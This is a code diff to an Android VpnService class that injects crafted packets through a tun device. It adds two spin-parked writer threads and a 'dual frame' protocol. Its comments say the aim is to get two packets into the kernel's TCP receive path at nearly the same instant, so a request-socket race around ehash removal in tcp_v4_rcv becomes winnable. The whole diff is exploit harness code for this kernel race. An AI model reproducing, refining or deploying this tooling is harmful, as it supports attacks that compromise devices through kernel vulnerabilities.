@@ -78,6 +78,20 @@ public class InjService extends VpnService {
     private static final int WORKERS = 8;
     private static final int BURST_MARK = 0xFFFFFFFF;
 
+    /**
+     * Frame marker for a pair of packets that must reach the kernel at the same
+     * instant on different cpus.
+     *
+     * A normal burst cannot do this. The workers wake from notifyAll() one at a
+     * time, so the first one has usually already driven its packet all the way
+     * through tcp_v4_rcv - including the ehash removal that the race depends on
+     * - before the second one even leaves wait(). Two spin-parked threads
+     * instead notice a new generation within tens of nanoseconds of each other,
+     * which is the resolution this needs.
+     */
+    private static final int DUAL_MARK = 0xFFFFFFFE;
+    private static final int RACE_WRITERS = 2;
+
     private static final int ACK_BYTE = 0x06;
     private static final int OUT_BYTE = 0x07;
 
@@ -88,12 +102,29 @@ public class InjService extends VpnService {
     private final AtomicLong injected = new AtomicLong();
     private final AtomicLong drained = new AtomicLong();
     private final AtomicLong bursts = new AtomicLong();
+    private final AtomicLong duals = new AtomicLong();
 
     /** Burst staging area, written by the pump thread and read by the workers. */
     private volatile byte[][] stage = new byte[0][];
     private volatile int stageSeq = 0;
     private final AtomicInteger stageDone = new AtomicInteger(0);
     private final Object stageLock = new Object();
+
+    /**
+     * Handoff for the dual-write path.
+     *
+     * Two dedicated threads sit in a tight spin on dualSeq. Publishing a pair is
+     * one volatile store plus a release of the spin flag, so both writers leave
+     * their loop within a few cache line transfers of each other instead of
+     * through a monitor wakeup. dualAck counts completions so the publisher can
+     * wait for both writes to drain before reusing the slot.
+     */
+    private volatile byte[] dualA = null;
+    private volatile byte[] dualB = null;
+    private volatile int dualSeq = 0;
+    private volatile boolean dualGo = false;
+    private final AtomicInteger dualAck = new AtomicInteger(0);
+    private volatile boolean dualDead = false;
     private ParcelFileDescriptor tun;
     private ServerSocket listener;
 
@@ -163,6 +194,17 @@ public class InjService extends VpnService {
                 w.start();
             }
 
+            // Two writers that live in a spin loop rather than a monitor wait.
+            // They exist only for dual frames, where the two packets have to
+            // enter write() at essentially the same moment for the request
+            // socket race to have any chance.
+            for (int i = 0; i < RACE_WRITERS; i++) {
+                final int slot = i;
+                Thread r = new Thread(() -> raceWriteLoop(device, slot), "tun-race" + i);
+                r.setDaemon(true);
+                r.start();
+            }
+
             // The tun endpoint only exists once establish() has returned, so the
             // native probe has to run here rather than from the activity. An
             // earlier attempt bound straight after startForegroundService and got
@@ -196,6 +238,19 @@ public class InjService extends VpnService {
                         | ((lengthField[1] & 0xff) << 16)
                         | ((lengthField[2] & 0xff) << 8)
                         | (lengthField[3] & 0xff);
+
+                if (length == DUAL_MARK) {
+                    if (!readDualPair(frame, lengthField)) {
+                        break;
+                    }
+                    long n = duals.incrementAndGet();
+                    if (n <= 3 || n % 25 == 0) {
+                        Log.i(TAG, "dual #" + n + " total=" + injected.get()
+                                + " drained=" + drained.get());
+                    }
+                    writeAck(out);
+                    continue;
+                }
 
                 if (length == BURST_MARK) {
                     byte[] cnt = new byte[2];
@@ -346,6 +401,132 @@ public class InjService extends VpnService {
             out.write(ACK_BYTE);
             out.flush();
         }
+    }
+
+    /**
+     * Read a dual frame: exactly two packets, published together.
+     *
+     * Layout matches the length prefixed packets used everywhere else, just
+     * without the count field, because a dual frame is always a pair.
+     */
+    private boolean readDualPair(InputStream frame, byte[] lengthField) throws Exception {
+        byte[] first = null;
+        byte[] second = null;
+
+        for (int i = 0; i < 2; i++) {
+            if (!readFully(frame, lengthField, 4)) {
+                return false;
+            }
+            int n = ((lengthField[0] & 0xff) << 24)
+                    | ((lengthField[1] & 0xff) << 16)
+                    | ((lengthField[2] & 0xff) << 8)
+                    | (lengthField[3] & 0xff);
+            if (n < 20 || n > MAX_PACKET) {
+                Log.w(TAG, "rejecting dual member length " + n);
+                return false;
+            }
+            byte[] one = new byte[n];
+            if (!readFully(frame, one, n)) {
+                return false;
+            }
+            if (i == 0) {
+                first = one;
+            } else {
+                second = one;
+            }
+        }
+
+        publishDual(first, second);
+        return true;
+    }
+
+    /**
+     * Sit in a spin loop waiting for a dual frame, then write immediately.
+     *
+     * write() on an unbuffered FileOutputStream goes straight to the tun fd, so
+     * the instant this thread returns from the spin is the instant tun_get_user
+     * starts running on this cpu. Two of these threads therefore put the two
+     * packets into the receive path with only a cache line transfer between
+     * them, which is what makes the request socket race reachable at all.
+     *
+     * The output stream is deliberately not shared with the ordinary workers:
+     * a shared stream means a shared lock, and a lock means one of the two
+     * writes waits for the other to finish before it even starts.
+     */
+    private void raceWriteLoop(ParcelFileDescriptor device, int slot) {
+        OutputStream sink;
+        try {
+            sink = new FileOutputStream(device.getFileDescriptor());
+        } catch (Exception e) {
+            Log.e(TAG, "race writer failed to open: " + e);
+            return;
+        }
+
+        int seen = 0;
+        while (running.get() && !dualDead) {
+            if (dualSeq == seen) {
+                Thread.onSpinWait();
+                continue;
+            }
+
+            seen = dualSeq;
+            byte[] mine = slot == 0 ? dualA : dualB;
+
+            // Wait for the publisher to release both writers. Spinning here
+            // rather than returning early keeps the two threads phase aligned:
+            // neither can start its write while the other is still on the way
+            // out of the previous generation.
+            while (!dualGo && running.get() && !dualDead) {
+                Thread.onSpinWait();
+            }
+
+            if (mine != null) {
+                try {
+                    sink.write(mine, 0, mine.length);
+                } catch (Exception e) {
+                    Log.e(TAG, "race write failed: " + e);
+                }
+            }
+
+            dualAck.incrementAndGet();
+        }
+
+        try {
+            sink.close();
+        } catch (Exception ignored) {
+        }
+    }
+
+    /**
+     * Hand two packets to the race writers and wait for both writes to land.
+     *
+     * dualGo is cleared before dualAck is reset so a writer that is still
+     * inside write() from the previous round cannot be mistaken for one that
+     * has already picked up the new pair.
+     */
+    private void publishDual(byte[] a, byte[] b) {
+        int target = 2;
+
+        dualGo = false;
+        dualAck.set(0);
+
+        dualA = a;
+        dualB = b;
+
+        // Publish both payloads and the generation before releasing the spin,
+        // so a writer that sees dualGo == true also sees the correct arrays.
+        dualSeq++;
+        dualGo = true;
+
+        long deadline = System.currentTimeMillis() + 1000;
+        while (dualAck.get() < target && running.get() && !dualDead) {
+            if (System.currentTimeMillis() > deadline) {
+                break;
+            }
+            Thread.onSpinWait();
+        }
+
+        injected.addAndGet(2);
     }
 
     /**
